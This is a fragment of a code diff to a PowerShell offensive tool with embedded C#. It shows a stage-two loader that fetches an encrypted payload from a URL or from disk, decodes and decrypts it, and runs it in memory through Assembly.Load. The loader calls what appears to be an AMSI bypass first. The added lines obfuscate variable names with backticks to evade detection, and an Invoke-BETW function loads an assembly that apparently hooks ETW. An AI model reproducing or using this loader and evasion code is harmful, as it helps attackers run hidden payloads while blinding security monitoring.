-                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
-                            cs.Close();
-                        }
-                        decryptedBytes = ms.ToArray();
-                    }
-                    catch
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
-                        Console.ResetColor();
-                    }
-                }
-            }
-            return decryptedBytes;
-        }
-        public byte[] GetRandomBytes()
-        {
-            int _saltSize = 4;
-            byte[] ba = new byte[_saltSize];
-            RNGCryptoServiceProvider.Create().GetBytes(ba);
-            return ba;
-        }
-        public static byte[] Decompress(byte[] data)
-        {
-            using (var compressedStream = new MemoryStream(data))
-            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
-            using (var resultStream = new MemoryStream())
-            {
-                var buffer = new byte[32768];
-                int read;
-                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
-                {
-                    resultStream.Write(buffer, 0, read);
-                }
-                return resultStream.ToArray();
-            }
-        }
-        public static byte[] Base64_Decode(string encodedData)
-        {
-            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
-            return encodedDataAsBytes;
-        }
-        public static string ReadPassword()
-        {
-            string password = "";
-            ConsoleKeyInfo info = Console.ReadKey(true);
-            while (info.Key != ConsoleKey.Enter)
-            {
-                if (info.Key != ConsoleKey.Backspace)
-                {
-                    Console.Write("*");
-                    password += info.KeyChar;
-                }
-                else if (info.Key == ConsoleKey.Backspace)
-                {
-                    if (!string.IsNullOrEmpty(password))
-                    {
-                        password = password.Substring(0, password.Length - 1);
-                        int pos = Console.CursorLeft;
-                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
-                        Console.Write(" ");
-                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
-                    }
-                }
-                info = Console.ReadKey(true);
-            }
-            Console.WriteLine();
-            return password;
-        }
-        public static void loadAssembly(byte[] bin, object[] commands)
-        {
-            gofor4msi.now();
-            Assembly a = Assembly.Load(bin);
-            try
-            {
-                a.EntryPoint.Invoke(null, new object[] { commands });
-            }
-            catch
-            {
-                MethodInfo method = a.EntryPoint;
-                if (method != null)
-                {
-                    object o = a.CreateInstance(method.Name);
-                    method.Invoke(o, null);
-                }
-            }
-        }
-        public static void Main(params string[] args)
-        {
-            PrintBanner();
-            if (args.Length != 2)
-            {
-                Console.WriteLine("Parameters missing");
-            }
-            string location = args[0];
-            string ishttp = "http";
-            string Stage2;
-            if (location.StartsWith(ishttp))
-            {
-                Console.Write("[*] One moment while getting our file from URL.... ");
-                Stage2 = Get_Stage2(location);
-            }
-            else
-            {
-                Console.WriteLine("NO URL, loading from disk.");
-                Console.Write("[*] One moment while getting our file from disk.... ");
-                Stage2 = Get_Stage2disk(location);
-            }
-            Console.WriteLine("-> Done");
-            Console.WriteLine();
-            Console.Write("[*] Decrypting file in memory... > ");
-            string Password = args[1];
-            Console.WriteLine();
-            byte[] decoded = Base64_Decode(Stage2);
-            byte[] decompressed = Decompress(decoded);
-            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
-            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
-            int _saltSize = 4;
-            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
-            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
-            {
-                originalBytes[i - _saltSize] = bytesDecrypted[i];
-            }
-            object[] cmd = args.Skip(2).ToArray();
-            loadAssembly(originalBytes, cmd);
-        }
-    }
-}
-"@
-
-Add-Type -TypeDefinition $SA
-
-if ($noArgs)
+if (${NO`A`RGs})
 {
     [SA.Program]::Main("$location","$password")
 }
-elseif ($argument3)
+elseif (${Ar`GUM`EnT3})
 {
     [SA.Program]::Main("$location","$password","$argument","$argument2", "$argument3")
 }
-elseif ($argument2)
+elseif (${aRGUm`eN`T2})
 {
     [SA.Program]::Main("$location","$password","$argument","$argument2")
 }
-elseif ($argument)
+elseif (${aRGum`EnT})
 {
     [SA.Program]::Main("$location","$password","$argument")
 }
@@ -310,5 +52,3 @@ function Invoke-BETW
     $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($bin64))
     [Agent.hooketw.hook]::Main("")
 }
-
-
